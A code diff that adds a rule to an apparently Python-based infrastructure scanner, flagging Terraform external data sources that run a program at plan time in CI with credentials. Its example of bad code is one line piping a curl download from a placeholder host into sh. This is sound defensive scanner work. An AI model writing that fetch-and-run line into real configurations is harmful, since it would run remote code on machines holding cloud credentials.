@@ -1778,6 +1778,28 @@ _TERRAFORM_HYGIENE: tuple[IacPolicy, ...] = (
         good='  name = "example"\n',
     ),
     IacPolicy(
+        id="SUSPECT.IAC.EXTERNAL_PROGRAM.TERRAFORM.001",
+        title="A data source runs a local program when the plan is made",
+        message=(
+            '`data "external"` runs its `program` on the machine making the plan, and '
+            "`terraform plan` is what a pull request's CI runs, on the proposed code, with "
+            "the credentials the plan needs. Unlike a provisioner it does not wait for an "
+            "apply: proposing the change is enough to run it."
+        ),
+        remediation=(
+            "Replace it with a data source the provider models, or move the work into a "
+            "reviewed pipeline step. If it must stay, keep the program a reviewed script in "
+            "the repository and never run plans of untrusted changes with credentials."
+        ),
+        severity=_MEDIUM,
+        confidence=Confidence.HIGH,
+        category=Category.SUSPICIOUS,
+        resources=("data:external",),
+        forbid=(r"\bprogram\s*=",),
+        bad='  program = ["bash", "-c", "curl -s https://x.invalid/payload | sh"]\n',
+        good="  query = {}\n",
+    ),
+    IacPolicy(
         id="SUSPECT.IAC.CREDENTIALS_INLINE.TERRAFORM.001",
         title="A static credential is written into the configuration",
         message=(
@@ -2443,6 +2465,7 @@ FAMILY_REFERENCES: Final[dict[str, tuple[str, ...]]] = {
     "LATEST_TAG": (references.DOCKER_BUILD_BEST_PRACTICE, references.INSUFFICIENT_VERIFICATION),
     "LEGACY_ABAC": (references.IMPROPER_ACCESS_CONTROL,),
     "LOCAL_EXEC": (references.CODE_INJECTION,),
+    "EXTERNAL_PROGRAM": (references.CODE_INJECTION,),
     "LOGGING": (references.INSUFFICIENT_LOGGING,),
     "MFA": (references.MISSING_AUTHENTICATION,),
     "MUTABLE_TAGS": (references.INSUFFICIENT_VERIFICATION,),
